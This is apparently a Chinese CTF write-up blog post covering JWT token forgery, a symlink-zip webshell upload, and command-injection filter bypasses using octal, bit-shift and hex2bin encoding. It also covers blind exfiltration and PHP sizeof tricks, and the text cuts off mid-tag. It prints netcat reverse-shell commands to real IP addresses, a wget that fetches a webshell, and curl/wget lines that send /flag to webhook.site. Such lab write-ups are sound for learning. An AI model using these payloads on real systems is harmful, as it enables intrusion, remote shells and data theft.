{"title":"赛题总结3","uid":"a31a5557cbeb213ac7cdc723f501dbeb","slug":"赛题总结3","date":"2024-10-31T12:43:45.000Z","updated":"2024-10-31T12:44:43.827Z","comments":true,"path":"api/articles/赛题总结3.json","keywords":null,"cover":"/image/11.png","content":"<h1 id=\"JWT令牌伪造\"><a href=\"#JWT令牌伪造\" class=\"headerlink\" title=\"JWT令牌伪造\"></a>JWT令牌伪造</h1><h2 id=\"JSON-Web-Token\"><a href=\"#JSON-Web-Token\" class=\"headerlink\" title=\"JSON Web Token\"></a>JSON Web Token</h2><p> <img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%933/image-20241030191356664.png\" alt=\"image-20241030191356664\"></p>\n<p> <img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%933/image-20241030191359864.png\" alt=\"image-20241030191359864\"></p>\n<h2 id=\"HFCTF2020-EasyLogin\"><a href=\"#HFCTF2020-EasyLogin\" class=\"headerlink\" title=\"HFCTF2020 EasyLogin\"></a>HFCTF2020 EasyLogin</h2><p><a href=\"https://buuoj.cn/challenges#[HFCTF2020]EasyLogin\">https://buuoj.cn/challenges#[HFCTF2020]EasyLogin</a></p>\n<p>发现提示知道是koa框架</p>\n<p>经查询koa框架主要逻辑代码在 <strong>controller&#x2F;api.js</strong>中</p>\n<p>访问&#x2F;controllers&#x2F;api.js得到主要逻辑代码得知身份为admin是可读取flag</p>\n<p>并且使用<strong>jwt</strong>来识别身份</p>\n<p>抓包获取当前jwt信息</p>\n<p> <img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%933/image-20241030191404788.png\" alt=\"image-20241030191404788\"></p>\n<p> <img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%933/image-20241030191407500.png\" alt=\"image-20241030191407500\"></p>\n<p>利用nodejs的jwt缺陷，<strong>当jwt的secretid为空</strong>，（不能为null&amp;undefined）</p>\n<p>jwt会采用algorithm为<strong>none</strong>进行解密。</p>\n<p>即 secretid&#x3D;[] 或 srcretid&#x3D;0.1很小的数 并且 “alg”&#x3D;none 就相当于<strong>没有加密算法</strong></p>\n<p>用python脚本来构造目标<strong>jwt令牌</strong> <strong>iat也要对应</strong></p>\n<p> <img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%933/image-20241030191413217.png\" alt=\"image-20241030191413217\"></p>\n<p> <img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%933/image-20241030191416789.png\" alt=\"image-20241030191416789\"></p>\n<p>访问&#x2F;api&#x2F;flag即可</p>\n<h2 id=\"CISCN2019-华北赛区-ikun\"><a href=\"#CISCN2019-华北赛区-ikun\" class=\"headerlink\" title=\"CISCN2019 华北赛区 ikun\"></a>CISCN2019 华北赛区 ikun</h2><p>[<a href=\"https://buuoj.cn/challenges#[CISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day1%20Web2\\]ikun]\">https://buuoj.cn/challenges#[CISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day1%20Web2\\]ikun]</a>(<a href=\"https://buuoj.cn/challenges#[CISCN2019\">https://buuoj.cn/challenges#[CISCN2019</a> 华北赛区 Day1 Web2]ikun)</p>\n<p>根据提示买下<strong>V6会员</strong></p>\n<p>爆破出v6会员在<strong>181页</strong></p>\n<p>抓包购买界面 发现可以<strong>修改折扣</strong> </p>\n<p>修改后<strong>直接买下</strong></p>\n<p>  <img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%933/image-20241030191443416.png\" alt=\"image-20241030191443416\">                             </p>\n<p>出现此页面 再次抓包修改身份</p>\n<p> <img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%933/image-20241030191436985.png\" alt=\"image-20241030191436985\"></p>\n<p>通过抓包页面判断出通过<strong>JWT令牌识别身份</strong></p>\n<p><strong>使用c-jwt-cracker爆破出 Srcret</strong></p>\n <img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%933/image-20241030191434283.png\" alt=\"image-20241030191434283\" style=\"zoom:150%;\">\n\n<p>进行身份构造</p>\n<h1 id=\"RCE\"><a href=\"#RCE\" class=\"headerlink\" title=\"RCE\"></a>RCE</h1><h2 id=\"软链接-ln-s\"><a href=\"#软链接-ln-s\" class=\"headerlink\" title=\"软链接  ln -s\"></a>软链接  ln -s</h2><h3 id=\"CISCN2023-Unzip\"><a href=\"#CISCN2023-Unzip\" class=\"headerlink\" title=\"CISCN2023 Unzip\"></a>CISCN2023 Unzip</h3><p>如图在 <strong>122目录</strong>下存在<strong>文件233</strong></p>\n<p><img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%933/image-20240516192628417.png\" alt=\"image-20240516192628417\"></p>\n<p>返回其他目录创建软链接 <strong>ln -s 1&#x2F;122&#x2F;233 lj</strong></p>\n<p><img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%933/image-20240516192807368.png\" alt=\"image-20240516192807368\"></p>\n<p>即可在其他目录查看文件内容</p>\n<p><img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%933/image-20240516192846592.png\" alt=\"image-20240516192846592\"></p>\n<p>同理也<strong>可以指定目录</strong>，下面题目用到</p>\n<p><img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%933/image-20240516195627772.png\" alt=\"image-20240516195627772\"></p>\n<p><img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%933/image-20240516195705980.png\" alt=\"image-20240516195705980\"></p>\n<h3 id=\"unzip\"><a href=\"#unzip\" class=\"headerlink\" title=\"unzip\"></a>unzip</h3><p><img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%933/image-20240516193901983.png\" alt=\"image-20240516193901983\"></p>\n<p>阅读代码发现回先进入到&#x2F;tmp目录再进行解压</p>\n<p>所以我们要上传zip文件</p>\n<p>1.先创建软链接 <strong>ln -s &#x2F;var&#x2F;www&#x2F;html slj</strong></p>\n<p>2.<strong>将软链接打包后将本体删除</strong></p>\n<p>3.创建一个与<strong>软链接同名</strong>的目录</p>\n<p>4.进入目录创建木马</p>\n<p>5.将同名目录打包</p>\n<p>6.上传两个压缩包</p>\n<p><img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%933/image-20240516213439954.png\" alt=\"image-20240516213439954\"></p>\n<p>7.url&#x2F;shell.php连接蚁剑即可</p>\n<p><img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%933/image-20240516213424092.png\" alt=\"image-20240516213424092\"></p>\n<p><img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%933/image-20240516213514576.png\" alt=\"image-20240516213514576\"></p>\n<h2 id=\"换行符绕过注释\"><a href=\"#换行符绕过注释\" class=\"headerlink\" title=\"换行符绕过注释\"></a>换行符绕过注释</h2><h3 id=\"牢牢记住，逝者为大\"><a href=\"#牢牢记住，逝者为大\" class=\"headerlink\" title=\"牢牢记住，逝者为大\"></a>牢牢记住，逝者为大</h3><p><img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%933/image-20240510111400877.png\" alt=\"image-20240510111400877\"></p>\n<ol>\n<li>最后一行有注释符 <strong>#</strong> 用换行符 <strong>%a0</strong> 来绕过</li>\n<li>根据上边过滤可知需要进行<strong>二次传参</strong> </li>\n<li>system被过滤 用 <strong>&#96;</strong> 来代替</li>\n<li>cmd拼接到后边的<strong>mamba out</strong>,需要先闭合再注释掉</li>\n</ol>\n<p>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">%0a`$_GET[1]`;%23</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"思路一-反弹shell\"><a href=\"#思路一-反弹shell\" class=\"headerlink\" title=\"思路一 反弹shell\"></a><strong>思路一 反弹shell</strong></h4><p>ps:不要忘记<strong>分号</strong>闭合</p>\n<p><strong>&amp;1&#x3D;nc 101.37.70.128 7878 -e &#x2F;b’’in&#x2F;sh</strong>      b’’in绕过过滤</p>\n<p>进行反弹shell获取flag</p>\n<p><img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%933/image-20240510112050456.png\" alt=\"image-20240510112050456\"></p>\n<h4 id=\"思路二-远程下载木马\"><a href=\"#思路二-远程下载木马\" class=\"headerlink\" title=\"思路二 远程下载木马\"></a>思路二 远程下载木马</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget -O &lt;保存路径/文件名&gt; &lt;下载链接&gt;</span><br></pre></td></tr></table></figure>\n\n<p>现在攻击机上准备一份木马 she</p>\n<p><img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%933/image-20240510122747733.png\" alt=\"image-20240510122747733\"></p>\n<p>用python开启一个服务</p>\n<p><img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%933/image-20240510122834139.png\" alt=\"image-20240510122834139\"></p>\n<p>将该端口映射到公网上  用到nps内网穿透 效果呈现如下</p>\n<p><img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%933/image-20240510122937798.png\" alt=\"image-20240510122937798\"></p>\n<p>搭建成功之后 进行二次传参并构造下载文件命令</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload：</span><br><span class=\"line\"></span><br><span class=\"line\">%0a`$_GET[1]`;%23&amp;1=wget -O ./she.php http://101.37.70.128:10010/she</span><br></pre></td></tr></table></figure>\n\n<p>访问url&#x2F;she.php连接蚁剑即可</p>\n<p><img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%933/image-20240510123312205.png\" alt=\"image-20240510123312205\"></p>\n<h2 id=\"八进制构造命令-移位构造二进制命令\"><a href=\"#八进制构造命令-移位构造二进制命令\" class=\"headerlink\" title=\"八进制构造命令 移位构造二进制命令\"></a>八进制构造命令 移位构造二进制命令</h2><h3 id=\"ezRCE\"><a href=\"#ezRCE\" class=\"headerlink\" title=\"ezRCE\"></a>ezRCE</h3><p>用八进制构造命令</p>\n<p><img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%933/image-20240513184416735.png\" alt=\"image-20240513184416735\"></p>\n<p>可见</p>\n<p> **$’\\154\\163’ **和 <strong>ls</strong> 命令效果相同</p>\n<blockquote>\n<p>原理如下</p>\n<p>在Shell编程中，<code>ls -l</code>是用于列出目录内容的命令，其中<code>ls</code>表示列出目录内容，而<code>-l</code>表示以长格式显示。在你提供的表达式<code>$&#39;\\154\\163\\40\\55\\154&#39;</code>中，<code>\\</code>用于转义字符，这些反斜杠后面跟着的数字表示了对应字符的 ASCII 码值。而<code>\\154</code>对应于八进制ASCII码，其十进制值为108，表示字符<code>l</code>；<code>\\163</code>对应于字符<code>s</code>；<code>\\40</code>对应于ASCII码值为32的空格字符；<code>\\55</code>对应于ASCII码值为45的减号字符，也就是<code>-</code>。因此，表达式<code>$&#39;\\154\\163\\40\\55\\154&#39;</code>等同于<code>ls -l</code>。</p>\n</blockquote>\n<p>上述是八进制</p>\n<p>当可用字符只有0 和 1 时</p>\n<p><img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%933/image-20240513185602631.png\" alt=\"image-20240513185602631\"></p>\n<p>可以利用</p>\n<p><img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%933/image-20240513185703638.png\" alt=\"image-20240513185703638\"></p>\n<p>来实现构造目标八进制数字</p>\n<p>用位移运算构造数字二</p>\n<p><img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%933/image-20240513185812640.png\" alt=\"image-20240513185812640\"></p>\n<p><code>1 &lt;&lt; 1</code> 是一个位移运算，表示将二进制数 1 向左移动 1 位。在位移运算中，向左移动意味着在数字的二进制表示中向左移动指定的位数，空出的位数用0填充。因此，<code>1</code> 的二进制表示是 <code>0001</code>，将其向左移动 1 位后，变成了 <code>0010</code>。结果是2</p>\n<p>反斜杠则是</p>\n<p><img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%933/image-20240513185902923.png\" alt=\"image-20240513185902923\"></p>\n<p>结合利用payload:</p>\n<p><strong>$\\‘\\\\$(($((1&lt;&lt;1))#10011010))\\\\$(($((1&lt;&lt;1))#10100011))\\&#39;</strong></p>\n<p>最后一个反斜杠确保整个命令的结束字符 \\</p>\n<p>第一个 \\ 是将**’\\\\$(($((1&lt;&lt;1))#10011010))\\\\$(($((1&lt;&lt;1))#10100011))\\&#39;<strong>转译为</strong>‘\\154\\163’**</p>\n<p><img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%933/image-20240513192034448.png\" alt=\"image-20240513192034448\"></p>\n<p>空格被过滤 ${IFS}无效时</p>\n<p>可以这样构造</p>\n<p><img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%933/image-20240513193158266.png\" alt=\"image-20240513193158266\"></p>\n<p><img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%933/image-20240513192842812.png\" alt=\"image-20240513192842812\"></p>\n<p>由于不能存在空格</p>\n<p>所以eval {ls,&#x2F;}仍无效</p>\n<p>利用脚本构造</p>\n<p><img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%933/image-20240513193300837.png\" alt=\"image-20240513193300837\"></p>\n<p><img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%933/image-20240513193325933.png\" alt=\"image-20240513193325933\"></p>\n<p>payload:</p>\n<p><strong>$’\\142\\141\\163\\150’&lt;&lt;&lt;$’\\173\\154\\163\\54\\57\\175’</strong> bash&lt;&lt;&lt;{ls,&#x2F;}</p>\n<p><strong>$’\\142\\141\\163\\150’&lt;&lt;&lt;$’\\173\\143\\141\\164\\54\\57\\146\\154\\141\\147\\175’</strong>  bash&lt;&lt;&lt;{cat,&#x2F;flag}</p>\n<p><img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%933/image-20240513193448586.png\" alt=\"image-20240513193448586\"></p>\n<h2 id=\"hex2bin函数构造16进制命令\"><a href=\"#hex2bin函数构造16进制命令\" class=\"headerlink\" title=\"hex2bin函数构造16进制命令\"></a>hex2bin函数构造16进制命令</h2><h3 id=\"CISCN2024\"><a href=\"#CISCN2024\" class=\"headerlink\" title=\"CISCN2024\"></a>CISCN2024</h3><h3 id=\"simple-php\"><a href=\"#simple-php\" class=\"headerlink\" title=\"simple php\"></a>simple php</h3><p><img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%933/image-20240520175303300.png\" alt=\"image-20240520175303300\"></p>\n<p>发现**$cmd<strong>嵌套</strong>在system函数中<strong>，</strong>不是eval函数中**，所以此时的命令会传入命令行中，要以命令行（终端）的角度来执行</p>\n<h4 id=\"命令行运行php代码\"><a href=\"#命令行运行php代码\" class=\"headerlink\" title=\"命令行运行php代码\"></a>命令行运行php代码</h4><p><img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%933/image-20240520173817845.png\" alt=\"image-20240520173817845\"><img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%933/image-20240520175620229.png\" alt=\"image-20240520175620229\"></p>\n<p>阅读题干发现无法正常传入命令（被过滤）八进制也无效果（引号被ban）</p>\n<p>可以结合php中的<strong>hex2bin函数</strong>来<strong>传入16进制命令</strong>  </p>\n<p><strong>6c73202f</strong> &#x2F;&#x2F; <strong>ls &#x2F;</strong>  可以根据思路<strong>构造反弹shell命令</strong></p>\n<p><img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%933/image-20240520180042312.png\" alt=\"image-20240520180042312\"></p>\n<h4 id=\"构造16进制命令\"><a href=\"#构造16进制命令\" class=\"headerlink\" title=\"构造16进制命令\"></a>构造16进制命令</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">6e632034372e39392e34332e33382037383738202d65202f62696e2f7368** // **nc 47.99.43.38 7878 -e /bin/sh**</span><br><span class=\"line\"></span><br><span class=\"line\">1.system(hex2bin(substr(_6e632034372e39392e34332e33382037383738202d65202f62696e2f7368,1)));</span><br><span class=\"line\"></span><br><span class=\"line\">2.system(hex2bin(substr(&#x27;6e632034372e39392e34332e33382037383738202d65202f62696e2f7368&#x27;,0)));</span><br></pre></td></tr></table></figure>\n\n<p>经过实验可得，以上两种方法均可反弹shell,<strong>1 的优势是可以绕过引号使用</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload: POST</span><br><span class=\"line\"></span><br><span class=\"line\">cmd=php -r system(hex2bin(substr(_6e632034372e39392e34332e33382037383738202d65202f62696e2f7368,1)));</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"连接数据库\"><a href=\"#连接数据库\" class=\"headerlink\" title=\"连接数据库\"></a>连接数据库</h4><p>成功反弹后发现无flag目录，这里看wp才知道，<strong>flag可能在数据库中</strong></p>\n<p>就要在反弹的shell中进行mysql数据库连接</p>\n<p>想办法知道<strong>用户名和密码</strong>是什么，最简单的就是弱口令</p>\n<p>尝试 root root后发现连接成功</p>\n<p>payload:</p>\n<p><img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%933/image-20240520183101345.png\" alt=\"image-20240520183101345\"></p>\n<p><img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%933/image-20240520183111822.png\" alt=\"image-20240520183111822\"></p>\n<h2 id=\"shell-exec无回显外带\"><a href=\"#shell-exec无回显外带\" class=\"headerlink\" title=\"shell_exec无回显外带\"></a>shell_exec无回显外带</h2><h3 id=\"听不见我的声音\"><a href=\"#听不见我的声音\" class=\"headerlink\" title=\"听不见我的声音\"></a>听不见我的声音</h3><p><img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%933/image-20241031160734551.png\" alt=\"image-20241031160734551\"></p>\n<h3 id=\"方法一\"><a href=\"#方法一\" class=\"headerlink\" title=\"方法一\"></a>方法一</h3><h4 id=\"cmd-反引号的利用\"><a href=\"#cmd-反引号的利用\" class=\"headerlink\" title=\"$(cmd)  反引号的利用\"></a>$(cmd)  反引号的利用</h4><p><img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%933/image-20241013185802672.png\" alt=\"image-20241013185802672\"></p>\n<p>了解功能之后，我们可以使用数据外带网站</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl https://webhook.site/d7e0265c-ccf6-4ad6-ae49-80ac2e02e240/`<span class=\"built_in\">cat</span> /flag`</span><br><span class=\"line\">curl https://webhook.site/d7e0265c-ccf6-4ad6-ae49-80ac2e02e240/$(<span class=\"built_in\">cat</span> /flag)</span><br><span class=\"line\">wget https://webhook.site/d7e0265c-ccf6-4ad6-ae49-80ac2e02e240/`<span class=\"built_in\">cat</span> /flag`</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"方法二\"><a href=\"#方法二\" class=\"headerlink\" title=\"方法二\"></a>方法二</h3><p>将命令回显定向到指定文件中</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cat</span> /flag &gt; 1.txt</span><br></pre></td></tr></table></figure>\n\n<p>访问1.txt即可</p>\n<h1 id=\"Bypass\"><a href=\"#Bypass\" class=\"headerlink\" title=\"Bypass\"></a>Bypass</h1><h2 id=\"sizeof-POST-‘len’-sizeof-array\"><a href=\"#sizeof-POST-‘len’-sizeof-array\" class=\"headerlink\" title=\"sizeof($_POST[‘len’]) &#x3D;&#x3D; sizeof($array)\"></a>sizeof($_POST[‘len’]) &#x3D;&#x3D; sizeof($array)</h2><h3 id=\"basectf\"><a href=\"#basectf\" class=\"headerlink\" title=\"basectf\"></a>basectf</h3><h3 id=\"玩原神玩的\"><a href=\"#玩原神玩的\" class=\"headerlink\" title=\"玩原神玩的\"></a>玩原神玩的</h3><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">&#x27;flag.php&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">sizeof</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;len&#x27;</span>]) == <span class=\"title function_ invoke__\">sizeof</span>(<span class=\"variable\">$array</span>)) &#123;</span><br><span class=\"line\">  <span class=\"title function_ invoke__\">ys_open</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;tip&#x27;</span>]);</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">  <span class=\"keyword\">die</span>(<span class=\"string\">&quot;错了！就你还想玩原神？❌❌❌&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">ys_open</span>(<span class=\"params\"><span class=\"variable\">$tip</span></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (<span class=\"variable\">$tip</span> != <span class=\"string\">&quot;我要玩原神&quot;</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">&quot;我不管，我要玩原神！😭😭😭&quot;</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"title function_ invoke__\">dumpFlag</span>();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">dumpFlag</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (!<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;m&#x27;</span>]) || <span class=\"title function_ invoke__\">sizeof</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;m&#x27;</span>]) != <span class=\"number\">2</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">&quot;可恶的QQ人！😡😡😡&quot;</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"variable\">$a</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;m&#x27;</span>][<span class=\"number\">0</span>];</span><br><span class=\"line\">  <span class=\"variable\">$b</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;m&#x27;</span>][<span class=\"number\">1</span>];</span><br><span class=\"line\">  <span class=\"keyword\">if</span>(<span class=\"keyword\">empty</span>(<span class=\"variable\">$a</span>) || <span class=\"keyword\">empty</span>(<span class=\"variable\">$b</span>) || <span class=\"variable\">$a</span> != <span class=\"string\">&quot;100%&quot;</span> || <span class=\"variable\">$b</span> != <span class=\"string\">&quot;love100%&quot;</span> . <span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$a</span>)) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">&quot;某站崩了？肯定是某忽悠干的！😡😡😡&quot;</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">include</span> <span class=\"string\">&#x27;flag.php&#x27;</span>;</span><br><span class=\"line\">  <span class=\"variable\">$flag</span>[] = <span class=\"keyword\">array</span>();</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"variable\">$ii</span> = <span class=\"number\">0</span>;<span class=\"variable\">$ii</span> &lt; <span class=\"title function_ invoke__\">sizeof</span>(<span class=\"variable\">$array</span>);<span class=\"variable\">$ii</span>++) &#123;</span><br><span class=\"line\">    <span class=\"variable\">$flag</span>[<span class=\"variable\">$ii</span>] = <span class=\"title function_ invoke__\">md5</span>(<span class=\"title function_ invoke__\">ord</span>(<span class=\"variable\">$array</span>[<span class=\"variable\">$ii</span>]) ^ <span class=\"variable\">$ii</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">json_encode</span>(<span class=\"variable\">$flag</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"第一部分\"><a href=\"#第一部分\" class=\"headerlink\" title=\"第一部分\"></a>第一部分</h3><h4 id=\"sizeof-POST-‘len’-sizeof-array-1\"><a href=\"#sizeof-POST-‘len’-sizeof-array-1\" class=\"headerlink\" title=\"sizeof($_POST[‘len’]) &#x3D;&#x3D; sizeof($array)\"></a>sizeof($_POST[‘len’]) &#x3D;&#x3D; sizeof($array)</h4><p>可以先在本地看一下<code>sizeof($_POST[&#39;len&#39;])</code>的返回值是什么</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;len&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"variable\">$lenCount</span> = <span class=\"title function_ invoke__\">sizeof</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;len&#x27;</span>]);</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;Length of len array: &quot;</span> . <span class=\"variable\">$lenCount</span>; <span class=\"comment\">// 应该输出 45</span></span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&#x27;len&#x27; parameter is not set.&quot;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%933/image-20241013150514357.png\" alt=\"image-20241013150514357\"></p>\n<p>可见<strong>POST传几次len返回值就是几</strong></p>\n<p>这里并不知道<code>sizeof($array)</code>长度是多少，进行爆破试出来是45，payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST:</span><br><span class=\"line\">len[]=0&amp;len[]=1&amp;len[]=2&amp;len[]=3&amp;len[]=4&amp;len[]=5&amp;len[]=6&amp;len[]=7&amp;len[]=8&amp;len[]=9&amp;len[]=10&amp;len[]=11&amp;len[]=12&amp;len[]=13&amp;len[]=14&amp;len[]=15&amp;len[]=16&amp;len[]=17&amp;len[]=18&amp;len[]=19&amp;len[]=20&amp;len[]=21&amp;len[]=22&amp;len[]=23&amp;len[]=24&amp;len[]=25&amp;len[]=26&amp;len[]=27&amp;len[]=28&amp;len[]=29&amp;len[]=30&amp;len[]=31&amp;len[]=32&amp;len[]=33&amp;len[]=34&amp;len[]=35&amp;len[]=36&amp;len[]=37&amp;len[]=38&amp;len[]=39&amp;len[]=40&amp;len[]=41&amp;len[]=42&amp;len[]=43&amp;len[]=44</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"第二部分\"><a href=\"#第二部分\" class=\"headerlink\" 